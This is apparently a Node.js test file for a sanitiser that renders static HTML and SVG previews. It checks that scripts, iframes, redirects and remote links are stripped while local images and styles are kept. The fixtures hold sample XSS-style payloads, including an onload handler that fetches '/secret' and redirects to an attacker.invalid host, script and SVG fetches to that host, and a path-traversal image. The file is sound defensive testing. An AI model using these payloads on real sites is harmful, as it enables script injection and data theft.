import assert from 'node:assert/strict';
import test from 'node:test';
import { parse, serialize } from 'parse5';
import { staticFilePreview } from '../../packages/control/dist/static-file-preview.js';

test('static HTML previews retain passive local assets and remove executable or navigable content', () => {
  const rendered = staticFilePreview('report.html', Buffer.from(`<!doctype html>
    <html><head>
      <base href="https://attacker.invalid/">
      <meta http-equiv="refresh" content="0;url=https://attacker.invalid/refresh">
      <link rel="stylesheet" href="styles/report.css">
      <link rel="preload" href="https://attacker.invalid/payload.js" as="script">
      <style>body { background-image: url(https://attacker.invalid/css); }</style>
    </head><body onload="fetch('/secret').then(() => location='https://attacker.invalid/')">
      <a href="https://attacker.invalid/link" target="_top">Rendered link text</a>
      <form action="https://attacker.invalid/form"><button formaction="https://attacker.invalid/button">Send</button></form>
      <iframe src="https://attacker.invalid/frame"></iframe>
      <object data="https://attacker.invalid/object"></object>
      <script src="payload.js"></script><script>window.location = 'https://attacker.invalid/script'</script>
      <img src="images/chart.png" srcset="https://attacker.invalid/chart.png 2x">
      <img src="../private/secret.png">
      <img src="https://qubicl.invalid/selected/deceptive.png">
      <img src="//qubicl.invalid/selected/deceptive.png">
      <img src="data:image/png;base64,AA==">
      <img src="data:image/svg+xml,<svg onload=alert(1)></svg>">
      <video src="media/demo.mp4" poster="images/poster.webp"></video>
    </body></html>`, 'utf8')).toString('utf8');

  assert.match(rendered, /<link rel="stylesheet" href="styles\/report\.css">/u);
  assert.match(rendered, /<img src="images\/chart\.png">/u);
  assert.match(rendered, /<img src="data:image\/png;base64,AA==">/u);
  assert.match(rendered, /<video src="media\/demo\.mp4" poster="images\/poster\.webp"><\/video>/u);
  assert.match(rendered, />Rendered link text<\/a>/u);
  assert.match(rendered, />Send<\/button><\/form>/u);
  assert.doesNotMatch(rendered, /<script|<iframe|<object|<base|<meta/iu);
  assert.doesNotMatch(rendered, /onload=|target=|action=|formaction=|srcset=/iu);
  assert.doesNotMatch(rendered, /href="https:\/\/attacker\.invalid|src="\.\.\/private|qubicl\.invalid|data:image\/svg\+xml/iu);
});

test('static SVG previews remove scripts, navigation, embedded documents, and href animation', () => {
  const rendered = staticFilePreview('diagram.svg', Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg">
    <script>fetch('https://attacker.invalid/script')</script>
    <a href="https://attacker.invalid/link"><text>Label</text></a>
    <foreignObject><iframe src="https://attacker.invalid/frame"></iframe></foreignObject>
    <animate attributeName="href" to="https://attacker.invalid/animate" />
    <set attributeName="href" to="https://attacker.invalid/set" />
    <image href="images/chart.png" />
    <image href="https://attacker.invalid/image.png" />
    <use href="#local-symbol" />
    <use href="https://attacker.invalid/symbol.svg#id" />
    <circle cx="10" cy="10" r="4" />
  </svg>`, 'utf8')).toString('utf8');

  assert.match(rendered, /<text>Label<\/text>/u);
  assert.match(rendered, /<image href="images\/chart\.png"><\/image>/u);
  assert.match(rendered, /<use href="#local-symbol"><\/use>/u);
  assert.match(rendered, /<circle cx="10" cy="10" r="4"><\/circle>/u);
  assert.doesNotMatch(rendered, /<script|foreignObject|<iframe|<animate|<set/iu);
  assert.doesNotMatch(rendered, /https:\/\/attacker\.invalid/iu);
});

test('static HTML previews remove noscript markup before a scripting-disabled browser reparses it', () => {
  const rendered = staticFilePreview('noscript.html', Buffer.from(`<!doctype html><html><head>
    <noscript>
      <meta http-equiv="refresh" content="0;url=https://attacker.invalid/refresh">
      <a href="https://attacker.invalid/navigation">leave</a>
    </noscript>
  </head><body><p>safe content</p></body></html>`, 'utf8')).toString('utf8');
  const browserView = serialize(parse(rendered, { scriptingEnabled: false }));

  assert.match(browserView, /<p>safe content<\/p>/u);
  assert.doesNotMatch(browserView, /<noscript|<meta|<a\b|http-equiv=|href=|attacker\.invalid/iu);
});

test('non-active preview assets are not rewritten', () => {
  const source = Buffer.from('body { color: rebeccapurple; }', 'utf8');
  assert.equal(staticFilePreview('report.css', source), source);
});
